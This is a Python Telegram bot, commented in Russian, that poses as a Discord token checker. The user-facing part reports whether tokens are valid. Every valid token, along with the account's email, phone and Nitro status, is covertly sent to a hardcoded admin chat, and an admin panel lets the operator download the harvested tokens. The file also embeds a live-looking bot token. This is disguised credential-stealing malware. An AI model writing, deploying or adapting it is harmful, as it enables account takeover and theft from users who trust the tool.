import requests
import logging
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# === Настройки ===
BOT_TOKEN = "8209112516:AAFy58svbPApAT_ghotBb6nv3iEcyLrT_VA"
ADMIN_CHAT_ID = 7804464367

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Хранилище для админки (в памяти; для продакшена — используй БД)
valid_tokens_log = []
nitro_tokens_log = []

def check_token(token):
    headers = {
        'Authorization': token.strip(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    try:
        user_resp = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        if user_resp.status_code != 200:
            return {'valid': False}

        user_data = user_resp.json()

        billing_resp = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=10)
        has_nitro = len(billing_resp.json()) > 0 if billing_resp.status_code == 200 else False

        friends_resp = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=10)
        friends_count = len(friends_resp.json()) if friends_resp.status_code == 200 else 0

        guilds_resp = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
        owned_guilds = sum(1 for g in guilds_resp.json() if g.get('owner')) if guilds_resp.status_code == 200 else 0

        return {
            'valid': True,
            'username': user_data.get('username', 'Unknown'),
            'discriminator': user_data.get('discriminator', '0000'),
            'email': user_data.get('email', 'None'),
            'phone': user_data.get('phone', 'None'),
            'nitro': 'Yes' if has_nitro else 'No',
            'friends': friends_count,
            'owned_guilds': owned_guilds,
            'token': token.strip()
        }

    except Exception as e:
        logger.error(f"Ошибка при проверке токена: {e}")
        return {'valid': False}

# Отправка токена админу (в фоне)
async def notify_admin_valid_token(context: ContextTypes.DEFAULT_TYPE, info: dict, user_id: int, username: str):
    try:
        message = (
            f"🆕 Новый валидный токен от @{username} (ID: {user_id})\n\n"
            f"User: {info['username']}#{info['discriminator']}\n"
            f"Email: {info['email']} | Phone: {info['phone']}\n"
            f"Friends: {info['friends']} | Guilds: {info['owned_guilds']}\n"
            f"Nitro: {info['nitro']}\n\n"
            f"Token:\n<code>{info['token']}</code>"
        )
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            parse_mode="HTML"
        )

        # Сохраняем в лог (для /admin)
        valid_tokens_log.append(info['token'])
        if info['nitro'] == 'Yes':
            nitro_tokens_log.append(info['token'])

    except Exception as e:
        logger.error(f"Не удалось отправить админу токен: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Привет! Отправь мне список Discord-токенов — по одному на строку.\n"
        "Я проверю их и покажу результаты.\n\n"
        "⚠️ Используй только свои токены!"
    )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tokens = [line.strip() for line in update.message.text.splitlines() if line.strip()]
    if not tokens:
        await update.message.reply_text("⚠️ Нет токенов.")
        return

    await update.message.reply_text(f"🔍 Проверяю {len(tokens)} токенов...")

    results = []
    valid_count = 0
    nitro_count = 0

    for i, token in enumerate(tokens, 1):
        info = check_token(token)
        if info['valid']:
            valid_count += 1
            if info['nitro'] == 'Yes':
                nitro_count += 1
                status = "✅ VALID + NITRO"
            else:
                status = "✅ VALID"

            result_line = (
                f"{i}. {status} | {info['username']}#{info['discriminator']} | "
                f"Email: {info['email']} | Phone: {info['phone']} | "
                f"Friends: {info['friends']} | Guilds: {info['owned_guilds']}\n"
                f"   Token: {info['token']}"
            )
            results.append(result_line)

            # Отправляем админу (если не сам админ)
            if user.id != ADMIN_CHAT_ID:
                await notify_admin_valid_token(context, info, user.id, user.username or 'unknown')

        else:
            results.append(f"{i}. ❌ INVALID")

    # Сводка
    total = len(tokens)
    invalid = total - valid_count
    summary = (
        f"📊 Результаты:\n"
        f"Всего: {total}\n"
        f"Валидных: {valid_count}\n"
        f"С Nitro: {nitro_count}\n"
        f"Невалидных: {invalid}\n"
    )

    await update.message.reply_text(summary)

    for res in results:
        await update.message.reply_text(res)

# Админ-панель
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ Доступ запрещён.")
        return

    total_valid = len(valid_tokens_log)
    total_nitro = len(nitro_tokens_log)

    keyboard = [
        [InlineKeyboardButton("📥 Скачать все валидные", callback_data="download_valid")],
        [InlineKeyboardButton("🎁 Скачать токены с Nitro", callback_data="download_nitro")],
        [InlineKeyboardButton("🗑 Очистить логи", callback_data="clear_logs")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"🔐 Админ-панель\n\n"
        f"Всего валидных токенов: {total_valid}\n"
        f"С Nitro: {total_nitro}\n\n"
        f"Выберите действие:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.from_user.id != ADMIN_CHAT_ID:
        await query.message.reply_text("❌ Доступ запрещён.")
        return

    if query.data == "download_valid":
        if valid_tokens_log:
            text = "\n".join(valid_tokens_log)
            await query.message.reply_document(
                document=("valid_tokens_admin.txt", text.encode("utf-8")),
                caption=f"📎 Все валидные токены ({len(valid_tokens_log)})"
            )
        else:
            await query.message.reply_text("📭 Нет валидных токенов.")

    elif query.data == "download_nitro":
        if nitro_tokens_log:
            text = "\n".join(nitro_tokens_log)
            await query.message.reply_document(
                document=("nitro_tokens_admin.txt", text.encode("utf-8")),
                caption=f"🎁 Токены с Nitro ({len(nitro_tokens_log)})"
            )
        else:
            await query.message.reply_text("📭 Нет токенов с Nitro.")

    elif query.data == "clear_logs":
        valid_tokens_log.clear()
        nitro_tokens_log.clear()
        await query.message.reply_text("🗑 Логи очищены.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.StatusUpdate.ALL, button_handler))  # Для callback'ов
    logger.info("Бот запущен. Админ: 7804464367")
    app.run_polling()

if __name__ == "__main__":
    main()